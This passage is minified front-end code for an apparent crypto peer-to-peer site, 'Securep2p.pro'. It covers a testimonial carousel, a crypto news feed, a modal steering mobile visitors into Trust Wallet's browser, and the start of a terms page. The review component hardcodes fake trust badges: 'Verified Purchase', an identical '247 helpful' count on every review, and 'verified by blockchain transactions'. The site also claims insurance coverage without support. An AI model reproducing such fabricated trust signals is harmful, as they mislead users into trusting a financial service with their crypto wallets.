                                className: "absolute -bottom-1 -right-1 w-5 h-5 sm:w-6 sm:h-6 bg-green-500 rounded-full flex items-center justify-center border-2 border-white",
                                children: a.jsx(Hs, {
                                    className: "w-3 h-3 text-white"
                                })
                            })]
                        }), a.jsxs("div", {
                            className: "flex-1",
                            children: [a.jsxs("div", {
                                className: "flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-2 mb-1",
                                children: [a.jsx("h4", {
                                    className: `font-bold ${n.text} text-base sm:text-lg`,
                                    children: m.name
                                }), a.jsx("span", {
                                    className: "bg-blue-500/20 text-blue-400 px-2 py-1 rounded-full text-xs font-medium w-fit",
                                    children: "Verified User"
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center gap-2 mb-1 sm:mb-2",
                                children: [a.jsx(ps, {
                                    className: "w-4 h-4 text-purple-500"
                                }), a.jsx("span", {
                                    className: `text-xs sm:text-sm ${n.textSecondary}`,
                                    children: m.location
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center gap-1",
                                children: [[...Array(m.rating)].map( (h, x) => a.jsx(ir, {
                                    className: "w-3 h-3 sm:w-4 sm:h-4 text-yellow-400 fill-current"
                                }, x)), a.jsxs("span", {
                                    className: `ml-1 sm:ml-2 text-xs sm:text-sm font-medium ${n.textSecondary}`,
                                    children: [m.rating, ".0"]
                                })]
                            })]
                        })]
                    }), a.jsxs("blockquote", {
                        className: `${n.text} text-base sm:text-lg font-medium leading-relaxed mb-4 italic`,
                        children: ['"', m.text, '"']
                    }), a.jsxs("div", {
                        className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 sm:gap-4 pt-3 sm:pt-4 border-t ${themeClasses.border}",
                        children: [a.jsxs("div", {
                            className: "flex items-center gap-3 sm:gap-4 text-xs sm:text-sm",
                            children: [a.jsxs("div", {
                                className: "flex items-center gap-1",
                                children: [a.jsx(uf, {
                                    className: "w-4 h-4 text-red-500"
                                }), a.jsx("span", {
                                    className: n.textSecondary,
                                    children: "247 helpful"
                                })]
                            }), a.jsx("span", {
                                className: `${n.textSecondary} text-xs whitespace-nowrap`,
                                children: l[r] || "Recently"
                            })]
                        }), a.jsx("div", {
                            className: "flex items-center",
                            children: a.jsx("span", {
                                className: "text-green-500 text-xs font-medium whitespace-nowrap",
                                children: "Verified Purchase"
                            })
                        })]
                    })]
                })
            }), a.jsx("div", {
                className: "flex items-center justify-center gap-2 mt-4 sm:mt-6",
                children: e.map( (h, x) => a.jsx("button", {
                    onClick: () => c(x),
                    className: `w-2 h-2 sm:w-3 sm:h-3 rounded-full transition-all duration-300 ${x === r ? `bg-gradient-to-r ${n.gradient} shadow-lg scale-125` : `${t ? "bg-gray-700 hover:bg-gray-600" : "bg-gray-300 hover:bg-gray-400"}`}`
                }, x))
            }), a.jsx("div", {
                className: "mt-4 sm:mt-6 grid grid-cols-1 sm:grid-cols-2 gap-3",
                children: e.slice(0, 4).filter( (h, x) => x !== r).slice(0, 2).map( (h, x) => a.jsxs("div", {
                    className: `${n.cardBg} backdrop-blur-sm rounded-lg sm:rounded-xl p-3 border ${n.border} hover:shadow-lg transition-all duration-300 cursor-pointer ${n.hover}`,
                    onClick: () => c(e.indexOf(h)),
                    children: [a.jsxs("div", {
                        className: "flex items-center gap-2 mb-2",
                        children: [a.jsx("div", {
                            className: `w-7 h-7 sm:w-8 sm:h-8 rounded-lg bg-gradient-to-br ${n.gradient} flex items-center justify-center text-white text-xs font-bold`,
                            children: h.name.split(" ").map(y => y[0]).join("").toUpperCase()
                        }), a.jsxs("div", {
                            children: [a.jsx("div", {
                                className: `text-xs sm:text-sm font-medium ${n.text}`,
                                children: h.name
                            }), a.jsx("div", {
                                className: "flex items-center",
                                children: [...Array(h.rating)].map( (y, v) => a.jsx(ir, {
                                    className: "w-2.5 h-2.5 sm:w-3 sm:h-3 text-yellow-400 fill-current"
                                }, v))
                            })]
                        })]
                    }), a.jsxs("p", {
                        className: `text-xs ${n.textSecondary} line-clamp-2 leading-relaxed`,
                        children: ['"', h.text, '"']
                    })]
                }, x))
            }), a.jsx("div", {
                className: `mt-4 sm:mt-6 bg-gradient-to-r ${t ? "from-green-900/10 to-blue-900/10" : "from-green-50 to-blue-50"} rounded-xl p-3 sm:p-4 border ${t ? "border-green-800/30" : "border-green-200"} backdrop-blur-sm`,
                children: a.jsxs("div", {
                    className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 text-xs sm:text-sm",
                    children: [a.jsxs("div", {
                        className: "flex items-center gap-2",
                        children: [a.jsx(Hs, {
                            className: "w-4 h-4 text-green-600"
                        }), a.jsx("span", {
                            className: `font-medium ${t ? "text-green-300" : "text-green-800"}`,
                            children: "All reviews verified by blockchain transactions"
                        })]
                    }), a.jsx("div", {
                        className: `text-xs ${n.textSecondary} whitespace-nowrap`,
                        children: "Updated live"
                    })]
                })
            })]
        })]
    })
}
  , Ff = ({darkMode: e, themeClasses: t}) => {
    const n = ["Multi-signature security", "AML/KYC compliance", "Real-time monitoring", "Insurance coverage"];
    return a.jsxs("div", {
        className: `bg-gradient-to-r ${e ? "from-green-900/20 to-emerald-900/20" : "from-green-50 to-emerald-50"} border ${e ? "border-green-700" : "border-green-200"} rounded-3xl p-6 shadow-xl`,
        children: [a.jsxs("h3", {
            className: `font-semibold ${e ? "text-green-300" : "text-green-900"} mb-4 flex items-center`,
            children: [a.jsx(Fn, {
                className: "w-5 h-5 mr-2"
            }), "Security Features"]
        }), a.jsx("div", {
            className: "space-y-3 text-sm",
            children: n.map( (r, s) => a.jsxs("div", {
                className: `flex items-center ${e ? "text-green-300" : "text-green-800"}`,
                children: [a.jsx(tt, {
                    className: "w-4 h-4 mr-2"
                }), a.jsx("span", {
                    children: r
                })]
            }, s))
        })]
    })
}
  , Cc = ({darkMode: e, themeClasses: t}) => {
    const [n,r] = E.useState([])
      , [s,i] = E.useState(!0)
      , [o,l] = E.useState(0)
      , [u,c] = E.useState([])
      , m = [{
        name: "Cointelegraph",
        url: "https://cointelegraph.com/rss"
    }, {
        name: "CoinDesk",
        url: "https://www.coindesk.com/arc/outboundfeeds/rss/"
    }, {
        name: "Decrypt",
        url: "https://decrypt.co/feed"
    }, {
        name: "The Block",
        url: "https://www.theblock.co/rss.xml"
    }]
      , h = b => (b || "").replace(/<[^>]*>/g, "").replace(/\s+/g, " ").trim()
      , x = b => {
        if (!b)
            return new Date().toISOString();
        const N = new Date(b);
        return isNaN(N.getTime()) ? new Date().toISOString() : N.toISOString()
    }
      , y = b => {
        const N = new Date(b).getTime()
          , P = Date.now()
          , M = Math.max(0, P - N)
          , U = Math.floor(M / (60 * 1e3));
        if (U < 1)
            return "Just now";
        if (U < 60)
            return `${U} min${U > 1 ? "s" : ""} ago`;
        const D = Math.floor(U / 60);
        if (D < 24)
            return `${D} hour${D > 1 ? "s" : ""} ago`;
        const A = Math.floor(D / 24);
        return `${A} day${A > 1 ? "s" : ""} ago`
    }
      , v = b => {
        const N = b.toLowerCase();
        return /(defi|yield|liquidity|protocol|amm|dex|staking|lending)/.test(N) ? "defi" : /(sec|regulation|legal|compliance|lawsuit|policy)/.test(N) ? "regulation" : /(blockchain|network|upgrade|technology|layer 2|l2|zk|rollup)/.test(N) ? "technology" : "market"
    }
      , k = b => {
        const N = b.toLowerCase();
        return /(surge|rally|bullish|gains|soars|record high|etf approval|fund inflow)/.test(N) ? "positive" : /(crash|bearish|decline|falls|hack|exploit|outage|ban|lawsuit)/.test(N) ? "negative" : "neutral"
    }
      , p = (b, N) => {
        try {
            const M = new DOMParser().parseFromString(b, "text/xml")
              , U = Array.from(M.querySelectorAll("channel > item"));
            if (U.length)
                return U.map( (A, O) => {
                    var W, F, T, $, z, L, G, Q;
                    return {
                        title: ((W = A.querySelector("title")) == null ? void 0 : W.textContent) || `News Item ${O + 1}`,
                        link: ((F = A.querySelector("link")) == null ? void 0 : F.textContent) || "#",
                        pubDate: x(((T = A.querySelector("pubDate")) == null ? void 0 : T.textContent) || (($ = A.querySelector("dc\\:date, date")) == null ? void 0 : $.textContent) || ""),
                        description: ((z = A.querySelector("description")) == null ? void 0 : z.textContent) || ((L = A.querySelector("content\\:encoded")) == null ? void 0 : L.textContent) || "",
                        guid: ((G = A.querySelector("guid")) == null ? void 0 : G.textContent) || ((Q = A.querySelector("link")) == null ? void 0 : Q.textContent) || `item-${O}`,
                        source: N
                    }
                }
                );
            const D = Array.from(M.querySelectorAll("feed > entry"));
            return D.length ? D.map( (A, O) => {
                var L, G, Q, xe, Oe, Ae;
                const W = A.querySelector('link[rel="alternate"]') || A.querySelector("link")
                  , F = (W == null ? void 0 : W.getAttribute("href")) || "#"
                  , T = ((L = A.querySelector("summary")) == null ? void 0 : L.textContent) || ((G = A.querySelector("content")) == null ? void 0 : G.textContent) || ""
                  , $ = ((Q = A.querySelector("id")) == null ? void 0 : Q.textContent) || F || `entry-${O}`
                  , z = ((xe = A.querySelector("updated")) == null ? void 0 : xe.textContent) || ((Oe = A.querySelector("published")) == null ? void 0 : Oe.textContent) || "";
                return {
                    title: ((Ae = A.querySelector("title")) == null ? void 0 : Ae.textContent) || `News Item ${O + 1}`,
                    link: F,
                    pubDate: x(z),
                    description: T,
                    guid: $,
                    source: N
                }
            }
            ) : []
        } catch (P) {
            return console.error("XML parse error", P),
            []
        }
    }
      , f = async b => {
        const N = await fetch(b, {
            headers: {
                Accept: "application/xml, text/xml, text/plain, application/rss+xml"
            }
        });
        if (!N.ok)
            throw new Error(`HTTP ${N.status}`);
        return N.text()
    }
      , d = async b => {
        const N = [ () => f(b), () => fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(b)}`).then(M => {
            if (!M.ok)
                throw new Error(`AllOrigins HTTP ${M.status}`);
            return M.json()
        }
        ).then(M => {
            if (!(M != null && M.contents))
                throw new Error("AllOrigins: empty contents");
            return M.contents
        }
        ), () => fetch(`https://api.cors.is/get?url=${encodeURIComponent(b)}`).then(M => {
            if (!M.ok)
                throw new Error(`CORS.is HTTP ${M.status}`);
            return M.json()
        }
        ).then(M => {
            if (!(M != null && M.contents))
                throw new Error("CORS.is: empty contents");
            return M.contents
        }
        ), () => f("https://r.jina.ai/http://r.jina.ai/http://r.jina.ai/http://" + b.replace(/^https?:\/\//, "")).catch( () => f("https://r.jina.ai/http://" + b.replace(/^https?:\/\//, "")))];
        let P = null;
        for (const M of N)
            try {
                const U = await M();
                if (typeof U == "string" && U.length > 0)
                    return U
            } catch (U) {
                P = U;
                continue
            }
        throw P || new Error("All fetch methods failed")
    }
      , g = async () => {
        i(!0);
        const b = []
          , N = [];
        for (const D of m)
            try {
                const A = await d(D.url)
                  , O = p(A, D.name);
                O.forEach(W => {
                    W.title = h(W.title),
                    W.description = h(W.description),
                    W.pubDate = x(W.pubDate),
                    W.guid = (W.guid || W.link || "").slice(0, 512)
                }
                ),
                N.push(...O),
                b.push({
                    name: D.name,
                    ok: !0,
                    count: O.length
                })
            } catch (A) {
                console.warn(`Feed failed: ${D.name}`, A),
                b.push({
                    name: D.name,
                    ok: !1,
                    count: 0,
                    error: String((A == null ? void 0 : A.message) || A)
                })
            }
        const P = new Set
          , M = N.filter(D => {
            const A = D.guid || D.link || D.title;
            if (!A)
                return !1;
            const O = A.toLowerCase();
            return P.has(O) ? !1 : (P.add(O),
            !0)
        }
        );
        M.sort( (D, A) => new Date(A.pubDate).getTime() - new Date(D.pubDate).getTime());
        let U = M.slice(0, 20).map( (D, A) => {
            const O = `${D.title} ${D.description}`
              , W = v(O)
              , F = k(O)
              , T = y(D.pubDate)
              , $ = D.description.length > 160 ? D.description.slice(0, 160) + "…" : D.description || "Latest cryptocurrency news and market updates.";
            return {
                id: D.guid || `news-${A}`,
                title: D.title || `News Item ${A + 1}`,
                summary: $,
                source: D.source || "Unknown",
                publishedAt: T,
                category: W,
                impact: F,
                url: D.link || "#"
            }
        }
        );
        U.length === 0 && (U = [{
            id: "fallback-1",
            title: "Crypto markets mixed as traders await macro data",
            summary: "Major assets trade sideways while altcoins show isolated strength ahead of upcoming economic releases.",
            source: "Fallback",
            publishedAt: "Just now",
            category: "market",
            impact: "neutral",
            url: "#"
        }, {
            id: "fallback-2",
            title: "Layer-2 activity climbs on cheaper fees and new launches",
            summary: "Throughput and user counts grow across L2s as ecosystems push new upgrades and incentives.",
            source: "Fallback",
            publishedAt: "5 mins ago",
            category: "technology",
            impact: "positive",
            url: "#"
        }, {
            id: "fallback-3",
            title: "Regulators weigh new guidance for stablecoin issuers",
            summary: "Policy makers discuss reserve transparency and customer protection standards.",
            source: "Fallback",
            publishedAt: "12 mins ago",
            category: "regulation",
            impact: "neutral",
            url: "#"
        }]),
        c(b),
        r(U),
        i(!1),
        l(0)
    }
    ;
    E.useEffect( () => {
        g();
        const b = setInterval(g, 5 * 60 * 1e3);
        return () => clearInterval(b)
    }
    , []),
    E.useEffect( () => {
        if (n.length === 0)
            return;
        const b = setInterval( () => {
            l(N => (N + 1) % n.length)
        }
        , 8e3);
        return () => clearInterval(b)
    }
    , [n.length]);
    const S = b => {
        switch (b) {
        case "market":
            return Ra;
        case "defi":
            return Ot;
        case "regulation":
            return Qt;
        case "technology":
            return Me;
        default:
            return wc
        }
    }
      , w = b => {
        switch (b) {
        case "market":
            return "from-green-500 to-emerald-600";
        case "defi":
            return "from-purple-500 to-violet-600";
        case "regulation":
            return "from-orange-500 to-red-600";
        case "technology":
            return "from-blue-500 to-cyan-600";
        default:
            return "from-gray-500 to-gray-600"
        }
    }
      , j = b => {
        switch (b) {
        case "positive":
            return "text-green-600";
        case "negative":
            return "text-red-600";
        default:
            return t.textSecondary
        }
    }
    ;
    if (s)
        return a.jsx("div", {
            className: `${t.cardBg} rounded-3xl ${t.border} border overflow-hidden shadow-xl p-6`,
            children: a.jsxs("div", {
                className: "flex items-center justify-center py-8",
                children: [a.jsx("div", {
                    className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"
                }), a.jsx("span", {
                    className: `ml-3 ${t.textSecondary}`,
                    children: "Loading crypto news..."
                })]
            })
        });
    const B = n[o];
    return a.jsxs("div", {
        className: `${t.cardBg} rounded-xl sm:rounded-2xl lg:rounded-3xl ${t.border} border overflow-hidden shadow-xl`,
        children: [a.jsx("div", {
            className: `bg-gradient-to-r ${e ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} p-3 sm:p-4 border-b ${t.border}`,
            children: a.jsxs("div", {
                className: "flex items-center justify-between",
                children: [a.jsxs("div", {
                    className: "flex items-center space-x-3",
                    children: [a.jsx("div", {
                        className: `w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r ${t.gradient} rounded-xl sm:rounded-2xl flex items-center justify-center shadow-lg`,
                        children: a.jsx(wc, {
                            className: "w-4 h-4 sm:w-5 sm:h-5 text-white"
                        })
                    }), a.jsxs("div", {
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-2",
                            children: [a.jsx("span", {
                                className: `font-bold ${t.text} text-base sm:text-lg`,
                                children: "Crypto News"
                            }), a.jsx("div", {
                                className: "flex items-center space-x-1",
                                children: a.jsx("div", {
                                    className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                                })
                            })]
                        }), a.jsxs("div", {
                            className: `text-xs ${t.textSecondary}`,
                            children: [a.jsx("span", {
                                className: "hidden sm:inline",
                                children: "Latest market updates and insights"
                            }), a.jsx("span", {
                                className: "sm:hidden",
                                children: "Market updates"
                            })]
                        })]
                    })]
                }), a.jsx("div", {
                    className: "text-right",
                    children: a.jsxs("div", {
                        className: `text-xs ${t.textSecondary}`,
                        children: [a.jsxs("span", {
                            className: "hidden sm:inline",
                            children: [o + 1, " of ", n.length]
                        }), a.jsxs("span", {
                            className: "sm:hidden",
                            children: [o + 1, "/", n.length]
                        })]
                    })
                })]
            })
        }), a.jsxs("div", {
            className: "p-4 sm:p-6",
            children: [B && a.jsxs("div", {
                className: "space-y-3 sm:space-y-4",
                children: [a.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [( () => {
                            const b = S(B.category);
                            return a.jsx("div", {
                                className: `w-7 h-7 sm:w-8 sm:h-8 bg-gradient-to-r ${w(B.category)} rounded-lg sm:rounded-xl flex items-center justify-center shadow-lg`,
                                children: a.jsx(b, {
                                    className: "w-4 h-4 text-white"
                                })
                            })
                        }
                        )(), a.jsx("span", {
                            className: `text-xs sm:text-sm font-medium ${t.text} capitalize`,
                            children: B.category
                        })]
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-1 text-xs",
                        children: [a.jsx(im, {
                            className: `w-3 h-3 ${t.textSecondary}`
                        }), a.jsx("span", {
                            className: t.textSecondary,
                            children: B.publishedAt
                        })]
                    })]
                }), a.jsx("h3", {
                    className: `text-base sm:text-lg font-bold ${t.text} leading-tight`,
                    children: B.title
                }), a.jsx("p", {
                    className: `${t.textSecondary} text-xs sm:text-sm leading-relaxed`,
                    children: B.summary
                }), a.jsxs("div", {
                    className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 sm:gap-0 pt-3 border-t border-gray-200 dark:border-gray-700",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx("span", {
                            className: `text-xs ${t.textSecondary}`,
                            children: "Source:"
                        }), a.jsx("span", {
                            className: `text-xs font-medium ${t.text}`,
                            children: B.source
                        })]
                    }), a.jsxs("a", {
                        href: B.url,
                        target: "_blank",
                        rel: "noopener noreferrer",
                        className: "flex items-center space-x-2 hover:text-blue-600 transition-colors w-fit",
                        children: [a.jsxs("span", {
                            className: `text-xs font-medium ${j(B.impact)} capitalize whitespace-nowrap`,
                            children: [B.impact, " Impact"]
                        }), a.jsx(om, {
                            className: `w-3 h-3 ${t.textSecondary}`
                        })]
                    })]
                }), a.jsxs("div", {
                    className: "flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 sm:gap-0 pt-2 text-xs",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx("span", {
                            className: `${t.textSecondary}`,
                            children: "Category:"
                        }), a.jsx("span", {
                            className: "bg-blue-100 text-blue-800 px-2 py-1 rounded-full text-xs font-medium capitalize",
                            children: B.category
                        })]
                    }), a.jsx("div", {
                        className: "flex items-center space-x-1",
                        children: a.jsxs("span", {
                            className: `text-xs font-medium ${j(B.impact)} capitalize whitespace-nowrap`,
                            children: [B.impact, " sentiment"]
                        })
                    })]
                })]
            }), a.jsx("div", {
                className: "flex items-center justify-center space-x-2 mt-4 sm:mt-6",
                children: n.map( (b, N) => a.jsx("button", {
                    onClick: () => l(N),
                    className: `w-2 h-2 sm:w-2.5 sm:h-2.5 rounded-full transition-all duration-300 ${N === o ? `bg-gradient-to-r ${t.gradient} shadow-lg scale-125` : `${e ? "bg-gray-600 hover:bg-gray-500" : "bg-gray-300 hover:bg-gray-400"}`}`
                }, N))
            }), a.jsxs("div", {
                className: "mt-4 sm:mt-6 space-y-2",
                children: [a.jsx("h4", {
                    className: `text-xs sm:text-sm font-semibold ${t.text} mb-3`,
                    children: "Other Headlines"
                }), a.jsx("div", {
                    className: "space-y-2",
                    children: n.slice(0, 3).filter( (b, N) => N !== o).slice(0, 2).map( (b, N) => a.jsx("a", {
                        href: b.url,
                        target: "_blank",
                        rel: "noopener noreferrer",
                        className: `w-full text-left p-2 sm:p-3 rounded-lg sm:rounded-xl ${e ? "bg-gray-800/50 hover:bg-gray-700/50" : "bg-gray-50 hover:bg-gray-100"} border ${t.border} transition-all duration-200`,
                        children: a.jsxs("div", {
                            className: "flex items-start space-x-2 sm:space-x-3",
                            children: [( () => {
                                const P = S(b.category);
                                return a.jsx("div", {
                                    className: `w-5 h-5 sm:w-6 sm:h-6 bg-gradient-to-r ${w(b.category)} rounded-lg flex items-center justify-center flex-shrink-0 mt-0.5`,
                                    children: a.jsx(P, {
                                        className: "w-3 h-3 text-white"
                                    })
                                })
                            }
                            )(), a.jsxs("div", {
                                className: "flex-1 min-w-0",
                                children: [a.jsx("p", {
                                    className: `text-xs sm:text-sm font-medium ${t.text} line-clamp-2 leading-relaxed`,
                                    children: b.title
                                }), a.jsxs("div", {
                                    className: "flex flex-wrap items-center gap-1 sm:gap-2 mt-1",
                                    children: [a.jsx("span", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: b.source
                                    }), a.jsx("span", {
                                        className: `text-xs ${t.textSecondary} hidden sm:inline`,
                                        children: "•"
                                    }), a.jsx("span", {
                                        className: `text-xs ${t.textSecondary}`,
                                        children: b.publishedAt
                                    })]
                                })]
                            })]
                        })
                    }, N))
                })]
            }), a.jsxs("div", {
                className: `mt-4 sm:mt-6 bg-gradient-to-r ${e ? "from-green-900/20 to-blue-900/20" : "from-green-50 to-blue-50"} rounded-xl p-3 sm:p-4 border ${e ? "border-green-800" : "border-green-200"}`,
                children: [a.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [a.jsxs("div", {
                        className: "flex items-center space-x-2",
                        children: [a.jsx(Me, {
                            className: "w-4 h-4 text-green-600"
                        }), a.jsxs("span", {
                            className: `text-xs sm:text-sm font-medium ${e ? "text-green-300" : "text-green-800"}`,
                            children: ["Sources: ", u.map(b => `${b.name}${b.ok ? "" : "✕"}`).join(", ")]
                        })]
                    }), a.jsxs("div", {
                        className: `text-xs ${t.textSecondary}`,
                        children: [a.jsx("span", {
                            className: "hidden sm:inline",
                            children: "Auto-refresh every 5 min"
                        }), a.jsx("span", {
                            className: "sm:hidden",
                            children: "Auto 5min"
                        })]
                    })]
                }), a.jsx("div", {
                    className: "mt-2 grid grid-cols-1 sm:grid-cols-2 gap-1",
                    children: u.map( (b, N) => a.jsxs("div", {
                        className: "text-xs flex items-center justify-between",
                        children: [a.jsx("span", {
                            className: `${b.ok ? "text-green-600" : "text-orange-600"}`,
                            children: b.name
                        }), a.jsx("span", {
                            className: `${t.textSecondary}`,
                            children: b.ok ? `${b.count} items` : "fallback used"
                        })]
                    }, N))
                })]
            })]
        })]
    })
}
  , Kf = ({darkMode: e, themeClasses: t, show: n, onClose: r}) => {
    const [s,i] = E.useState(!1);
    E.useEffect( () => {
        if (Go()) {
            i(!1);
            return
        }
        if (n !== void 0) {
            i(n);
            return
        }
        if (um()) {
            const c = setTimeout( () => {
                i(!0)
            }
            , 2e3);
            return () => clearTimeout(c)
        }
    }
    , [n]);
    const o = () => {
        const c = window.location.href
          , m = dm(c);
        console.log("Opening Trust Wallet with URL:", m),
        console.log("Current URL:", c),
        window.location.href = m,
        l()
    }
      , l = () => {
        i(!1),
        r && r()
    }
      , u = () => {
        i(!1),
        r && r()
    }
    ;
    return s ? a.jsx(a.Fragment, {
        children: a.jsx("div", {
            className: "fixed inset-0 bg-black/50 backdrop-blur-sm z-[9999] flex items-center justify-center p-4",
            children: a.jsxs("div", {
                className: `${t.cardBg} rounded-3xl shadow-2xl max-w-md w-full border-2 ${e ? "border-blue-800" : "border-blue-200"} overflow-hidden relative z-[10000]`,
                children: [a.jsxs("div", {
                    className: `bg-gradient-to-r ${e ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} p-6 border-b ${t.border} relative`,
                    children: [a.jsx("button", {
                        onClick: l,
                        className: `absolute top-4 right-4 p-2 rounded-full ${t.hover} transition-colors`,
                        children: a.jsx(fs, {
                            className: `w-5 h-5 ${t.textSecondary}`
                        })
                    }), a.jsxs("div", {
                        className: "flex items-center space-x-3 mb-4",
                        children: [a.jsx("div", {
                            className: `w-12 h-12 bg-gradient-to-r ${t.gradient} rounded-2xl flex items-center justify-center shadow-lg`,
                            children: a.jsx(cm, {
                                className: "w-6 h-6 text-white"
                            })
                        }), a.jsxs("div", {
                            children: [a.jsx("h3", {
                                className: `text-xl font-bold ${t.text}`,
                                children: "Mobile DApp Access"
                            }), a.jsx("p", {
                                className: `text-sm ${t.textSecondary}`,
                                children: "Better experience available"
                            })]
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-orange-900/20" : "bg-orange-50"} border ${e ? "border-orange-700" : "border-orange-200"} rounded-xl p-3 flex items-start space-x-2`,
                        children: [a.jsx(Ki, {
                            className: "w-4 h-4 text-orange-600 mt-0.5 flex-shrink-0"
                        }), a.jsxs("div", {
                            className: `text-xs ${e ? "text-orange-300" : "text-orange-800"}`,
                            children: [a.jsx("strong", {
                                children: "Mobile Browser Detected:"
                            }), " This DApp requires a Web3 wallet browser for full functionality. Regular mobile browsers like Safari and Chrome don't support direct wallet connections."]
                        })]
                    })]
                }), a.jsxs("div", {
                    className: "p-6",
                    children: [a.jsxs("div", {
                        className: "text-center mb-6",
                        children: [a.jsxs("div", {
                            className: "flex justify-center mb-4",
                            children: [a.jsx("img", {
                                src: "https://trustwallet.com/assets/images/media/assets/trust_platform.svg",
                                alt: "Trust Wallet",
                                className: "w-16 h-16 rounded-2xl",
                                onError: c => {
                                    var m;
                                    c.currentTarget.style.display = "none",
                                    (m = c.currentTarget.nextElementSibling) == null || m.classList.remove("hidden")
                                }
                            }), a.jsx("div", {
                                className: "hidden w-16 h-16 bg-gradient-to-r from-blue-500 to-purple-600 rounded-2xl flex items-center justify-center",
                                children: a.jsx(pt, {
                                    className: "w-8 h-8 text-white"
                                })
                            })]
                        }), a.jsx("h4", {
                            className: `text-lg font-semibold ${t.text} mb-2`,
                            children: "Open in Trust Wallet Browser"
                        }), a.jsx("p", {
                            className: `text-sm ${t.textSecondary} mb-4`,
                            children: "For the best experience and full functionality, open this DApp in Trust Wallet's built-in browser."
                        })]
                    }), a.jsxs("div", {
                        className: "space-y-3 mb-6",
                        children: [a.jsxs("div", {
                            className: "flex items-center space-x-3",
                            children: [a.jsx("div", {
                                className: "w-8 h-8 bg-gradient-to-r from-green-500 to-emerald-600 rounded-xl flex items-center justify-center",
                                children: a.jsx(Fn, {
                                    className: "w-4 h-4 text-white"
                                })
                            }), a.jsxs("div", {
                                children: [a.jsx("div", {
                                    className: `text-sm font-medium ${t.text}`,
                                    children: "Secure Wallet Integration"
                                }), a.jsx("div", {
                                    className: `text-xs ${t.textSecondary}`,
                                    children: "Direct access to your crypto assets"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: "flex items-center space-x-3",
                            children: [a.jsx("div", {
                                className: "w-8 h-8 bg-gradient-to-r from-blue-500 to-cyan-600 rounded-xl flex items-center justify-center",
                                children: a.jsx(Ot, {
                                    className: "w-4 h-4 text-white"
                                })
                            }), a.jsxs("div", {
                                children: [a.jsx("div", {
                                    className: `text-sm font-medium ${t.text}`,
                                    children: "Instant Transactions"
                                }), a.jsx("div", {
                                    className: `text-xs ${t.textSecondary}`,
                                    children: "Fast and seamless crypto swaps"
                                })]
                            })]
                        }), a.jsxs("div", {
                            className: "flex items-center space-x-3",
                            children: [a.jsx("div", {
                                className: "w-8 h-8 bg-gradient-to-r from-purple-500 to-violet-600 rounded-xl flex items-center justify-center",
                                children: a.jsx(pt, {
                                    className: "w-4 h-4 text-white"
                                })
                            }), a.jsxs("div", {
                                children: [a.jsx("div", {
                                    className: `text-sm font-medium ${t.text}`,
                                    children: "Full DApp Support"
                                }), a.jsx("div", {
                                    className: `text-xs ${t.textSecondary}`,
                                    children: "Access all features without limitations"
                                })]
                            })]
                        })]
                    }), a.jsxs("div", {
                        className: "space-y-3",
                        children: [a.jsxs("button", {
                            onClick: o,
                            className: "w-full bg-gradient-to-r from-blue-600 to-purple-600 text-white py-4 rounded-2xl font-semibold hover:shadow-xl transition-all duration-300 flex items-center justify-center space-x-2",
                            children: [a.jsx(om, {
                                className: "w-5 h-5"
                            }), a.jsx("span", {
                                children: "Open in Trust Wallet"
                            })]
                        }), a.jsxs("div", {
                            className: "grid grid-cols-2 gap-3",
                            children: [a.jsx("button", {
                                onClick: u,
                                className: `border-2 ${t.border} ${t.text} py-3 rounded-xl font-medium ${t.hover} transition-all duration-300`,
                                children: "Remind Later"
                            }), a.jsx("button", {
                                onClick: l,
                                className: `${t.textSecondary} py-3 rounded-xl font-medium ${t.hover} transition-all duration-300`,
                                children: "Continue Here"
                            })]
                        })]
                    }), a.jsx("div", {
                        className: `mt-4 text-center text-xs ${t.textSecondary}`,
                        children: a.jsx("p", {
                            children: "Don't have Trust Wallet? Download it from your app store first."
                        })
                    })]
                })]
            })
        })
    }) : null
}
  , _f = ({darkMode: e, themeClasses: t, onClose: n}) => a.jsx("div", {
    className: "fixed inset-0 bg-black/50 backdrop-blur-sm z-[9999] flex items-center justify-center p-4",
    children: a.jsxs("div", {
        className: `${t.cardBg} rounded-3xl shadow-2xl max-w-4xl w-full max-h-[90vh] overflow-hidden border-2 ${e ? "border-blue-800" : "border-blue-200"}`,
        children: [a.jsxs("div", {
            className: `bg-gradient-to-r ${e ? "from-blue-900/30 to-purple-900/30" : "from-blue-50 to-purple-50"} p-6 border-b ${t.border} relative`,
            children: [a.jsx("button", {
                onClick: n,
                className: `absolute top-4 right-4 p-2 rounded-full ${t.hover} transition-colors`,
                children: a.jsx(fs, {
                    className: `w-5 h-5 ${t.textSecondary}`
                })
            }), a.jsxs("div", {
                className: "flex items-center space-x-3",
                children: [a.jsx("div", {
                    className: `w-12 h-12 bg-gradient-to-r ${t.gradient} rounded-2xl flex items-center justify-center shadow-lg`,
                    children: a.jsx(xf, {
                        className: "w-6 h-6 text-white"
                    })
                }), a.jsxs("div", {
                    children: [a.jsx("h2", {
                        className: `text-2xl font-bold ${t.text}`,
                        children: "Terms & Conditions"
                    }), a.jsx("p", {
                        className: `text-sm ${t.textSecondary}`,
                        children: "Securep2p.pro - Last updated: January 2025"
                    })]
                })]
            })]
        }), a.jsx("div", {
            className: "p-6 overflow-y-auto max-h-[calc(90vh-120px)]",
            children: a.jsxs("div", {
                className: "space-y-8",
                children: [a.jsxs("section", {
                    children: [a.jsx("div", {
